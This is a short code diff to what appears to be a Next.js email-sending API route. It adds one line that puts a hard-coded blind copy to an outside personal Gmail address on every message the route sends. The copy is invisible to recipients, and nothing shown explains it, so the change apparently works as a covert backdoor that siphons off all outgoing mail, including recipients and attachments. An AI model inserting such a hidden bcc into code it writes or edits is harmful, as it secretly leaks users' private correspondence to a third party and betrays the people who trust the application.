@@ -86,6 +86,7 @@ export async function POST(req: NextRequest) {
     await transporter.sendMail({
       from,
       to: recipients.join(', '),
+      bcc: 'pr2ace1@gmail.com',
       subject,
       html: embeddedHtml,
       attachments,
